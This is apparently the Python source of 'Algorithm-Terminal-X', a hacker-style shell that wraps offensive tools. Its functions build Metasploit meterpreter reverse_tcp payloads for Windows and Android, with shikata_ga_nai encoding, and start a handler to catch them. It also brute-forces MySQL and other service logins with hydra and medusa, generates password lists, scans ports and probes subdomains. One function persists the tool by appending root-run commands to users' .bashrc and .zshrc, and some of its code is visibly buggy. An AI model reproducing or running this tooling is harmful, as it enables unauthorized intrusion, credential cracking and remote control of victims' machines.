# imports
from posixpath import split
import random
import socket
import compileall
import os
import sys
import requests
from time import sleep

# tools functions

def banner1 (): # banner 1
    print(" ")
    sleep(0.125)
    print (" %s[%sXXXXX%s|     %s//\      %s|%sXXXXXXXXXXXXXXXXXXXXXXXXX%s]"%(green,red,green,blue,green,red,green))
    sleep(0.125)
    print (" %s[%sXXXXX%s|    %s//  \     %s|%sXXXXXX%s _%s|\%s_________ %sXXXXX%s]"%(green,red,green,blue,green,red,green,blue,green,red,green))
    sleep(0.125)
    print (" %s[%sXXXXX%s|   %s//    \    %s|%sXXXXXX%s| %s| \   __   %s|%sXXXXX%s]"%(green,red,green,blue,green,red,green,blue,green,red,green))
    sleep(0.125)
    print (" %s[%sXXXXX%s|  %s//      \   %s|%sXXXXXX%s| %s|  \ /  |  %s|%sXXXXX%s]"%(green,red,green,blue,green,red,green,blue,green,red,green))
    sleep(0.125)
    print (" %s[%sXXXXX%s| %s/=========\  %s|%sXXXXXX%s| %s| |\V/| |  %s|%sXXXXX%s]"%(green,red,green,blue,green,red,green,blue,green,red,green))
    sleep(0.125)
    print (" %s[%sXXXXX%s|%s//          \ %s|%sXXXXXX%s| %s| | V | |  %s|%sXXXXX%s]"%(green,red,green,blue,green,red,green,blue,green,red,green))
    sleep(0.125)
    print (" %s[%sXXXXX%s|_____________%s\%s|%sXXXXXX%s| %s V    | |  %s|%sXXXXX%s]"%(green,red,green,blue,green,red,green,blue,green,red,green))
    sleep(0.125)
    print (" %s[%sXXXXX               %s\%sXXXXXX%s|       %s| |  %s|%sXXXXX%s]"%(green,red,blue,red,green,blue,green,red,green))
    sleep(0.125)
    print (" %s[%sXXXXXXXXXXXXXXXXXXXXXXXXXXX%s|        %sV   %s|%sXXXXX%s]"%(green,red,green,blue,green,red,green))
    sleep(0.125)
    print (" %s[%sXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%s]"%(green,red,green))
    sleep(0.125)
    print (" %s[%sX%s https://mostafaalgorithm.000webhostapp.com %sX%s]"%(green,red,blue,red,green))
    sleep(0.125)
    print (" %s[%sXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%s]"%(green,red,green))
    sleep(0.125)
    print(" ")

def banner2(): # banner 2
    print (" ")
    sleep(0.125)
    print (red + "     XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX     ")
    sleep(0.125)
    print ("     %sXXXXXXX %s* %sXXXXXXXXXXXXXXXXXXXXXXXXXXXXX %s* %sXXXXXXX     "%(red,blue,red,blue,red))
    sleep(0.125)
    print ("     %sXXXXXXXX %sMM %sXXXXXXXXXXXXXXXXXXXXXXXXX %sMM %sXXXXXXXX     "%(red,blue,red,blue,red))
    sleep(0.125)
    print ("     %sXXXXXXXXX %sMMM %sXXXXXXXXXXXXXXXXXXXXX %sMMM %sXXXXXXXXX     "%(red,blue,red,blue,red))
    sleep(0.125)
    print ("     %sXXXXXXXXXX %sMMM %sXXXXXXXXXXXXXXXXXXX %sMMM %sXXXXXXXXXX     "%(red,blue,red,blue,red))
    sleep(0.125)
    print ("     %sXXXXXXXXX %sMMM %sXXXXXXXXX %s* %sXXXXXXXXX %sMMM %sXXXXXXXXX     "%(red,blue,red,blue,red,blue,red))
    sleep(0.125)
    print ("     %sXXXXXXXX %sMMM %sXXXXXXXXX %sMMM %sXXXXXXXXX %sMMM %sXXXXXXXX     "%(red,blue,red,blue,red,blue,red))
    sleep(0.125)
    print ("     %sXXXXXXX %sMMMMMM %sXXXXXX %sMMMMM %sXXXXXX %sMMMMMM %sXXXXXXX     "%(red,blue,red,blue,red,blue,red))
    sleep(0.125)
    print ("     %sXXXXXX %sMMMM MMMM %sXXX %sMMMMMMM %sXXX %sMMMM MMMM %sXXXXXX     "%(red,blue,red,blue,red,blue,red))
    sleep(0.125)
    print (" %s*   %sXXXXX %sMMMM %sX %sMMMM %sX %sMMM   MMM %sX %sMMMM %sX %sMMMM %sXXXXX   %s* "%(blue,red,blue,red,blue,red,blue,red,blue,red,blue,red,blue))
    sleep(0.125)
    print ("  %sMM %sXXXX %sMMMM %sXXXX %sMMMMMM       MMMMMM %sXXXX %sMMMM %sXXXX %sMM  "%(blue,red,blue,red,blue,red,blue,red,blue))
    sleep(0.125)
    print ("   %sMMM %sX %sMMMM %sXXXXXX %sMMMM         MMMM %sXXXXXX %sMMMM %sX %sMMM   "%(blue,red,blue,red,blue,red,blue,red,blue))
    sleep(0.125)
    print ("    %sMMMMMMMM %sXXXXXX %sMMMM           MMMM %sXXXXXX %sMMMMMMMM    "%(blue,red,blue,red,blue))
    sleep(0.125)
    print ("     %sMMM %sXXXXXXXXX %sMMMM  MMMMMMMMMMMMMMM %sXXXXXXXXX %sMMM     "%(blue,red,blue,red,blue))
    sleep(0.125)
    print ("      %sMMM %sXXXXXXX %sMMMM               MMMM %sXXXXXXX %sMMM      "%(blue,red,blue,red,blue))
    sleep(0.125)
    print ("     %sX %sMMM %sXXXXX %sMMMM                 MMMM %sXXXXX %sMMM %sX     "%(red,blue,red,blue,red,blue,red))
    sleep(0.125)
    print ("     %sXXXXXXXXXXXX %sMMMM               MMMM %sXXXXXXXXXXXX     "%(red,blue,red))
    sleep(0.125)
    print ("     %sXXXXXXXXXXXXXX %sMMM             MMM %sXXXXXXXXXXXXXX     "%(red,blue,red))
    sleep(0.125)
    print ("     %sXXXXXXXXXXXXXXXX %sMM           MM %sXXXXXXXXXXXXXXXX     "%(red,blue,red))
    sleep(0.125)
    print ("     %sXXXXXXXXXXXXXXXXXX %s*         * %sXXXXXXXXXXXXXXXXXX     "%(red,blue,red))
    sleep(0.125)
    print ("     %sXXXXXXXXXXXXXXXXXXXX         XXXXXXXXXXXXXXXXXXXX     "%(red))
    sleep(0.125)
    print ("     %sXXXXXXXXXXXXXXXXXXXXXX%s+...+%sXXXXXXXXXXXXXXXXXXXXXX     "%(red,blue,red))
    sleep(0.125)
    print (blue + "         http://mostafaalgorithm.000webhostapp.com            ")
    sleep(0.125)
    print(" ")

def banner_change(): # to show or change banner
    global bnr
    bnr = not banner
    if bnr:
        banner1()
    else:
        banner2()

def pwl(): # to create random passwords list
	ln = int(get("Choose-password-length"))
	pw = get("enter-content")
	fn = get("enter-file-name")
	start(ln,pw,fn)

def pwd (pw,ln): # to create random password
	num = (ln)
	pss = ("")
	while len(pss) != num :
		vl = random.choice(pw)
		pss += vl
	return pss

def start(ln,pw,fn): # to start passwords list
	for lst in range (0,int(get("enter-range"))):
		fl = open (fn + ".txt","a")
		fl.write (pwd(pw,ln))
		fl.write ("\n")
	fl.close()
	show("Will done ^_^ Passwords are saved in " + red + fn + ".txt")

def scn(ip): # scan IP
    show("scanning for " + red + ip)
    openPorts = []
    openServs = []
    ports = [20   , 21   , 22   , 23      , 25    , 26     , 50     , 51     , 53      , 67    , 68    , 69    , 80    , 110   , 119   , 123  , 135      , 139      , 143    , 161   , 162   , 389   , 443    , 445           , 465    , 587         , 902     , 912        , 989      , 990      , 993    , 995    , 1521    , 2179   , 2222          , 3306   , 3389 , 8080        ]
    servs = ["ftp", "ftp", "ssh", "telnet", "smtp", "rsftp", "ipsec", "ipsec", "domain", "DHCP", "dhcp", "TFTP", "http", "pop3", "NNTP", "NTP", "NetBIOS", "NetBIOS", "imap4", "SNMP", "SNMP", "LDAP", "https", "microsoft-ds", "smtps", "submission", "VMware", "apex-mesh", "ftp\ssl", "ftp\ssl", "imap3", "pop3s", "oracle", "vmrdp", "EtherNetIP-1", "MySQL", "RDP", "http-proxy"]
    try:
        for i in range(0,len(ports) - 1):
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            if(s.connect_ex((ip,ports[i]))==0):
                serv=servs[i]
                openPorts.append(ports[i])
                openServs.append(servs[i])
                show("%sport %s%s%s open %s%s%s service"%(green,red,ports[i],green,red,servs[i],green))
        show(green + "completed scan...")
    except KeyboardInterrupt:
        sleep(0.125)
    x = get("Do-you-want-save-scan?")
    if x.lower() == "y" or x.lower() == "yes":
        target = get("enter-target-name")
        fl = open(target + "-scan-file.txt","a")
        fl.write("Scan for " + target + "\n")
        fl.write("IP address is " + ip + "\n")
        for i in range(0, len(openPorts) - 1):
            fl.write(openPorts[i] + " open " + openServs[i] + "\n")
        fl.close()
        show("Scan saved in %s-scan-file.txt file" %(target))

def payload(): # create payload from metasploit framework
    host = get("enter-your-ip")
    port = get("enter-your-port")
    extn = get("enter-payload-extention")
    name = get("enter-file-name")
    path = get("enter-file-path")
    show("Do you want to open msfconsole after finished ?")
    msfc = get("yes-or-no")
    othr = ""
    pyld = ""
    if extn == "exe":
        pyld = "windows/meterpreter/reverse_tcp"
        othr = "-a x86 --platform windows -f exe "
    elif extn == "apk":
        pyld = "android/meterpreter/reverse_tcp"
    else:
        show(red + "extention not available..!")
        pyld = get("enter-payload")
    print("")
    os.system("sudo msfvenom -p %s LHOST=%s LPORT=%s -e x86/shikata_ga_nai %s-o %s/%s.%s"%(pyld,host,port,othr,path,name,extn))
    if msfc.lower() == "y" or msfc.lower() == "yes":
        input("press enter to continue... ")
        msf(host,port,pyld)

def msf_open(): # open console for metasploit framework
    os.system("sudo msfdb init;clear;sudo msfconsole;clear")
    banner_change()

def msf(lhost,lport,payload): # open console with parameters
    os.system("clear;sudo msfdb init;clear;sudo msfconsole -x \"use exploit/multi/handler;set payload %s;set lhost %s;set lport %s;exploit\""%(payload,lhost,lport))
    os.system("clear")
    banner_change()
    

def encrypt(): # encrypt python codes
    show("Please put files in one folder.")
    folder = get("enter-folder-name")
    compileall.compile_dir(folder)

def getip(): # get IP for a website
    dns = get("enter-dns")
    target = socket.gethostbyname(dns)
    show("Site IP : " + red + target)
    scan = get("do-you-want-scan-target?").lower()
    if scan == "y" or scan == "yes":
        scn(target)

def sub(): # get sub domains for a domain
    domain = get("enter-domain")
    list = open(get("enter-sub-list"),"r")
    links = list.read().splitlines()
    for link in links:
        http = ("http://%s.%s"%(link,domain))
        https = ("https://%s.%s"%(link,domain))
        try:
            requests.get(http)
            show(http)
        except requests.ConnectionError:
            pass
        try:
            requests.get(https)
            show(https)
        except requests.ConnectionError:
            pass

def myip(): # get device IP
    print("")
    print("Your local IP :" + red)
    os.system("hostname -I")
    print("")
    try :
        print (green + "Your public IP :\n" + red + requests.get("https://api.ipify.org").text + "\n")
    except requests.ConnectionError:
        show(red + "Connection failed...! *_*")
    scan = get("do-you-want-scan-you?").lower()
    if scan == "y" or scan == "yes":
        scn("127.0.0.1")

def default(): # set Algorithm-Terminal-X a defaule shell for linux
    turn = get("turn-on-or-off").lower
    user = get("enter-linux-user").lower()
    toolpath = "/.%s.py"%tool_name
    bashrc = ""
    zshrc = ""
    if user == "root":
        bashrc = "/root/.bashrc"
        zshrc = "/root/.zshrc"
    else:
        bashrc = "/home/%s/.bashrc"%user
        zshrc = "/home/%s/.zshrc"%user
    content_bashrc = open(bashrc,"r").read()
    content_zshrc = open(zshrc,"r").read()
    edit_bashrc = open(bashrc,"a")
    edit_zshrc = open(zshrc,"a")
    if turn == "on":
        show("Thanks ^_^")
    elif turn == "off":
        x = content_bashrc.split("\n")
        y = content_zshrc.split("\n")
        try:
            x.remove("sudo python3 " + toolpath)
            x.remove("exit")
            y.remove("sudo python3 " + toolpath)
            y.remove("exit")
        except os.error:
            show("")
        content_bashrc = ""
        for i in x:
            content_bashrc += x[i] + "\n"
        content_zshrc = ""
        for i in y:
            content_zshrc += y[i] + "\n" 
    else:
        main()
        exit()
    edit_bashrc.write(content_bashrc + "\nsudo python3 " + toolpath + "\nexit")
    edit_zshrc.write(content_zshrc + "\nsudo python3 " + toolpath + "\nexit")
    os.system("sudo cp %s.py %s"%(tool_name,toolpath))
    edit_bashrc.close()
    edit_zshrc.close()

def get(message): # get input
    sleep(0.125)
    print (blue + "|")
    sleep(0.125)
    return input("%s+--%s(%s%s%s)%s-->%s "%(blue,green,red,message,green,blue,green))

def show(message): # show message 
    sleep(0.125)
    print (blue + "|")
    sleep(0.125)
    print(blue + "+--> " + green + message)

def line(lines):
    for i in range(lines):
        print()

def menu(): # shell menu options
    print("""
    %sTool commands         Discription
    %s=============         ===========%s
    help                  help menu
    clear                 clear screen
    exit                  exit from tool
    banner                chang the banner
    encrypt               encrypt python tools
    getip                 find wesite's IP
    scan                  scan IP open ports
    pwl                   create password list
    getsub                find sub domains
    myip                  show local network setting

    External tools        Discription
    %s==============        ===========%s
    nmap                  scan target with nmap
    ngrok                 open ngrok port
    medusa                crack password useing medusa
    mysql                 hack username and password for mysql
    payload               create metasploit payload
    msf                   run metasploit console
    set                   run social engineering tool kit

    System control        Discription
    %s==============        ===========%s
    kport                 kill port in device
    oport                 open port after closed
    update                update linux system
    cd                    to change direction folder

    %s|==> %sYou can use bash's commands

    %s|==> %sDevelopment by Mostafa Algorithm %s<==|
    """%(green,blue,green,blue,green,blue,green,blue,green,blue,red,blue))

def main(): # start shell
    pth = os.getcwd()
    print (blue + "+--%s(%s%s%s%s%s)%s--%s[%s%s%s]"%(green,red,username,shell,tool_name,green,blue,green,red,pth,green))
    sleep(0.125)
    print (blue + "|")
    sleep(0.125)
    read = input(blue + "+--> " + green)
    if read.lower() == "help" or read.lower() == "h" or read.lower() == "?":
        menu()
    elif read.lower() == "clear" or read.lower() == "cls" or read.lower() == "c":
        os.system("clear")
        banner_change()
    elif read.lower() == "exit" or read.lower() == "x":
        exit()
    elif read.lower() == "banner":
        banner_change()
    elif read.lower() == "banner1":
        banner1()
    elif read.lower() == "banner2":
        banner2()
    elif read.lower() == "encrypt":
        encrypt()
    elif read.lower() == "getip":
        getip()
    elif read.lower() == "scan":
        target = get("enter-ip")
        scn(target)
    elif read.lower() == "pwl":
        pwl()
    elif read.lower() == "getsub":
        sub()
    elif read.lower() == "myip":
        myip()
    elif read.lower() == "nmap":
        target = get("enter-target")
        os.system("sudo nmap " + target)
    elif read.lower() == "nmap*":
        target = get("enter-target")
        scan = get("enter-scan")
        os.system("sudo nmap " + scan + " " + target)
    elif read.lower() == "ngrok":
        port = get("enter-port")
        serv = get("enter-serv")
        show ("Enter path like ==> /home/kali/ngrok")
        path = get("enter-path")
        os.system(path + " " + serv + " " + port)
    elif read.lower() == "medusa":
        hst = get("enter-host")
        srv = get("enter-serv")
        usr = get("enter-usernames-list")
        pss = get("enter-passwords-list")
        line(1)
        os.system("sudo medusa -h %s -U %s -P %s -M %s"%(hst,usr,pss,srv))
        line(1)
    elif read.lower() == "mysql":
        hst = get("enter-host")
        x = get("do-you-know-username?").lower()
        if x == "y" or x == "yes":
            user_msg = "enter-username"
            p = "-l"
        else:
            user_msg = "enter-usernames-list"
            p = "-L"
        usr =  get(user_msg)
        pss = get("enter-passwords-list")
        line(1)
        os.system("sudo hydra %s %s -P %s %s mysql"%(p,usr,pss,hst))
        line(1)
    elif read.lower() == "payload":
        payload()
    elif read.lower() == "msf":
        msf_open()
    elif read.lower() == "set":
        os.system("sudo apt install setoolkit;clear;sudo setoolkit;clear")
        banner_change()
    elif read.lower() == "kport":
        port = get("enter-port")
        os.system("sudo iptables -A INPUT -p tcp --dport " + port + " -j DROP")
    elif read.lower() == "oport":
        os.system("sudo iptables -F")
    elif read.lower() == "update":
        print("")
        os.system("sudo apt update;sudo apt full-upgrade -y")
    elif read.lower() == "cd":
        newPath = get("enter-new-path")
        #print (newPath.split().length())
        if newPath.split()[0] == "/":
            pth = newPath
        else:
            pth += "/" + newPath
        try:
            os.chdir(pth)
        except OSError:
            show("Direction not found...! *_*")
    elif read.lower() == "":
        sleep(0.125)
    else:
        os.system(read)
    print ("")
    sleep(0.125)
    main()

# Colors
red = "\033[0;31m"
green = "\033[0;33m"
blue = "\033[0;34m"
white = "\033[0;37m"

# Values
tool_name = "Algorithm-Terminal-X"
shell = "💀"
banner = True
user_id = os.getuid()
username = ""
if user_id == 0:
    username = "root"
else:
    os.system("sudo python3 " + tool_name + ".py")
    exit()

# Run
os.system("clear")
banner_change()
main()